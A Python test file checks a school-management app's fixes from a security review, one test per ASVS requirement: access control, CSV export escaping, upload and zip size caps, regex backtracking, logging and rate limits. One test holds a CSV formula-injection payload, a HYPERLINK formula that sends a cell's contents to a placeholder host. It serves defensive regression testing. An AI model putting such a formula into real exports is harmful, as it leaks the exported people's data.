"""The October 2026 security review's fixes (docs/security-review-2026-10.md), one test each. The
review walked OWASP ASVS 4.0.3 level 2; each test names the requirement it closes. Uses the cover
fixture: school_1 with Ana, Bala, Chitra and Dev, sections 10-A, 10-B and 9-A, and school_2."""
from __future__ import annotations

import asyncio
import io
import time
import zipfile
from types import SimpleNamespace

import pytest
from fastapi import HTTPException

from test_cover_routes import BASE, MON, _apply, w  # noqa: F401 - `w` is a fixture
from test_grants import _grant
from test_trust_fixes import _assessment


# ---- access control (V4) -----------------------------------------------------------------------

def test_an_assessment_keeps_the_paper_the_server_recorded(w):
    """F1: the paper an assessment marks against came from the request, so a teacher could point
    theirs at another school's paper and read its questions back through a scan."""
    a = _assessment(w, "ana")
    a["generatedPaperId"] = "paper_0123456789ab"
    r = w.c.put(f"/api/v1/assessments/{a['id']}", json=a, headers=w.t["ana"])
    assert r.status_code == 200, r.text
    assert r.json()["generatedPaperId"] is None


def test_a_new_assessment_brings_no_paper_of_its_own(w):
    """Nor on create: a school check alone would still let a teacher name a colleague's unreleased
    paper, which is the same school's."""
    a = _assessment(w, "ana")
    a.update(id="asm_made_by_put", generatedPaperId="paper_0123456789ab", status="draft")
    r = w.c.put("/api/v1/assessments/asm_made_by_put", json=a, headers=w.t["ana"])
    assert r.status_code == 200, r.text
    assert r.json()["generatedPaperId"] is None


def test_a_student_sees_a_lesson_but_not_the_teachers_note_on_it():
    """F2: the school's schedule went to students with each lesson's note and who marked it."""
    from academicos.curriculum.routes import _lesson_response
    lesson = SimpleNamespace(id="l1", school_id="school_1", academic_year_id="y", book_id="b",
                             subtopic_id="s", date=MON, status="completed", note="half the class was out",
                             completed_by="u_ana", completed_at=MON, created_at=MON, section_id="sec")
    assert _lesson_response(lesson).note == "half the class was out"
    seen = _lesson_response(lesson, for_student=True)
    assert seen.note is None and seen.completed_by is None and seen.status == "completed"


def test_only_the_principal_reopens_a_staff_account_and_nobody_a_former_principals(w):
    """Reopening gives access back. A delegated users admin may close a colleague's account (an
    earlier audit's decision) but not undo the principal's closing of one; and a former principal's
    account, which only the operator closes, could be reopened in the app, making someone who had
    left a principal again."""
    from academicos.curriculum import routes as cr
    users = cr._require_users()
    assert w.c.post(f"/api/v1/auth/users/{w.uid['ana']}/close", headers=w.p).status_code == 200
    assert _grant(w, "bala", "users").status_code == 200
    r = w.c.post(f"/api/v1/auth/users/{w.uid['ana']}/reopen", headers=w.t["bala"])
    assert r.status_code == 403 and "principal" in r.json()["detail"]
    assert w.c.post(f"/api/v1/auth/users/{w.uid['ana']}/reopen", headers=w.p).status_code == 200
    users._set_role(w.uid["chitra"], "left:principal")          # as the operator leaves one
    for who in (w.p, w.t["bala"]):
        assert w.c.post(f"/api/v1/auth/users/{w.uid['chitra']}/reopen", headers=who).status_code == 403
    assert users.get(w.uid["chitra"]).role == "left:principal"


def test_a_delegated_leave_admin_does_not_decide_their_own_leave(w):
    """F9: approving yourself skipped the principal and the school's leave rules."""
    assert _grant(w, "bala", "leave").status_code == 200
    own = _apply(w, "bala").json()
    r = w.c.post(f"{BASE}/leave-requests/{own['id']}/decision", json={"approve": True}, headers=w.t["bala"])
    assert r.status_code == 403
    others = _apply(w, "ana").json()
    assert w.c.post(f"{BASE}/leave-requests/{others['id']}/decision", json={"approve": True},
                    headers=w.t["bala"]).status_code == 200
    mark = w.c.put(f"{BASE}/teacher-attendance", params={"date": MON},
                   json={"marks": [{"teacherId": w.uid["bala"], "status": "present"}]}, headers=w.t["bala"])
    assert mark.status_code == 403
    assert w.c.post(f"{BASE}/leave-requests/{own['id']}/decision", json={"approve": True},
                    headers=w.p).status_code == 200


# ---- validation and files (V5, V12) ------------------------------------------------------------

def test_a_csv_cell_that_looks_like_a_formula_stays_text():
    """V5.3.1: a name such as =HYPERLINK(...) ran when the principal opened the export in Excel."""
    from academicos.operations.import_routes import _cell
    assert _cell('=HYPERLINK("https://x.example/?"&B2,"click")').startswith("'=")
    for risky in ("+1", "-1", "@SUM(A1)", "\tx", "\rx"):
        assert _cell(risky).startswith("'"), risky
    assert _cell("Asha") == "Asha" and _cell(None) == "" and _cell(42) == 42


def test_an_address_longer_than_an_address_is_refused_at_once():
    """V5.1.3: a megabyte cell of dots made the email pattern backtrack for minutes."""
    from academicos.operations.import_routes import _EMAIL
    start = time.perf_counter()
    assert _EMAIL.match("a@" + "." * 500_000 + "@") is None
    assert time.perf_counter() - start < 1.0
    assert _EMAIL.match("asha@school.example")


def test_a_document_that_unpacks_to_too_much_is_refused_before_it_is_opened(monkeypatch):
    """V12.1.2: a small file that inflated to gigabytes took the instance's memory."""
    from academicos.assessment import ingest_routes
    monkeypatch.setattr(ingest_routes, "MAX_ZIP_MEMBERS", 3)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for i in range(4):
            z.writestr(f"word/part{i}.xml", "<x/>")
    with pytest.raises(HTTPException) as e:
        ingest_routes.strip_macros(buf.getvalue())
    assert e.value.status_code == 413


def test_a_scan_page_over_the_cap_is_refused_without_reading_the_rest(monkeypatch):
    """V12.1.1: the page upload read the whole body, so one request could take the instance's memory."""
    from academicos.assessment import mobile_routes
    monkeypatch.setattr(mobile_routes, "MAX_SCAN_PAGE_BYTES", 10)
    monkeypatch.setattr(mobile_routes, "_get_session_to_process", lambda sid, cur: SimpleNamespace(pages=[]))
    monkeypatch.setattr(mobile_routes.mobile_scan, "add_page",
                        lambda *a, **k: pytest.fail("an oversized page must not be processed"))

    class Upload:
        async def read(self, n=-1):
            return b"x" * (n if n > 0 else 50)

    with pytest.raises(HTTPException) as e:
        asyncio.run(mobile_routes.upload_scan_page("scan_1", Upload(), SimpleNamespace(id="u")))
    assert e.value.status_code == 413
    monkeypatch.setattr(mobile_routes, "_get_session_to_process",
                        lambda sid, cur: SimpleNamespace(pages=[None] * mobile_routes.MAX_SCAN_PAGES))
    with pytest.raises(HTTPException) as e:
        asyncio.run(mobile_routes.upload_scan_page("scan_1", Upload(), SimpleNamespace(id="u")))
    assert e.value.status_code == 409


def test_a_status_that_is_not_text_is_a_422_not_a_500(w):
    """V5.1.4: a list-valued status crashed the membership test."""
    a = _assessment(w, "ana")
    r = w.c.patch(f"/api/v1/assessments/{a['id']}/status", json={"status": ["approved"]}, headers=w.t["ana"])
    assert r.status_code == 422


def test_registration_fields_are_bounded(w):
    """V2.1.2: a password over 128 characters, and names and emails with no bound at all."""
    r = w.c.post("/api/v1/auth/register", json={"name": "x" * 500, "email": "long@example.com",
                                                "password": "correct horse battery", "inviteCode": "nope"})
    assert r.status_code == 422
    r = w.c.post("/api/v1/auth/register", json={"name": "Asha", "email": "long@example.com",
                                                "password": "p" * 129, "inviteCode": "nope"})
    assert r.status_code == 422


# ---- errors, logging, data protection, business logic (V7, V8, V11, V14) -------------------------

def test_api_answers_are_not_cached_and_are_never_a_page(w):
    """V8.2.1 and V14.4.3: answers with children's records stayed in a shared browser's cache."""
    r = w.c.get("/api/v1/auth/me", headers=w.t["ana"])
    assert r.headers["cache-control"] == "no-store"
    assert r.headers["content-security-policy"] == "default-src 'none'; frame-ancestors 'none'"


def test_refused_requests_are_logged_with_the_route_and_who_asked(w, caplog):
    """V7.2.1 and V7.2.2: a refusal left no trace but a request line."""
    import logging
    with caplog.at_level(logging.WARNING, logger="academicos.api.main"):
        assert w.c.get(f"{BASE}/export", headers=w.t["ana"]).status_code == 403
        assert w.c.get("/api/v1/auth/me").status_code in (401, 403)
    lines = [r.getMessage() for r in caplog.records if r.getMessage().startswith("access refused")]
    assert any(f"actor={w.uid['ana']}" in l for l in lines), lines
    assert any("actor=-" in l for l in lines), lines


def test_one_person_cannot_loop_the_costly_routes(w, monkeypatch):
    """V11.1.3 and V11.1.4: the model, OCR and generation routes had no per-person allowance."""
    from academicos.assessment import auth_routes
    monkeypatch.setenv("ACOS_TEST_RATE_LIMIT", "1")
    monkeypatch.setattr(auth_routes._costly, "max_requests", 2)
    auth_routes._costly.reset()
    try:
        codes = [w.c.post("/v1/agent/doubt", json={}, headers=w.t["ana"]).status_code for _ in range(3)]
        assert codes[:2] != [429, 429] and codes[2] == 429, codes
        assert w.c.post("/v1/agent/doubt", json={}, headers=w.t["bala"]).status_code != 429, "per person"
    finally:
        auth_routes._costly.reset()


def test_operator_keys_are_not_open_to_guessing(w, monkeypatch):
    """V4.1.1: the operator's keys were compared in constant time but could be tried without end."""
    from academicos.api import rate_limit
    monkeypatch.setenv("ACOS_TEST_RATE_LIMIT", "1")
    monkeypatch.setenv("ACOS_OPS_KEY", "k" * 40)
    monkeypatch.setattr(rate_limit.operator_key_limiter, "max_requests", 2)
    rate_limit.operator_key_limiter.reset()
    try:
        codes = [w.c.get("/api/v1/ops/usage", headers={"X-Ops-Key": "guess"}).status_code for _ in range(3)]
        assert codes == [401, 401, 429], codes
    finally:
        rate_limit.operator_key_limiter.reset()
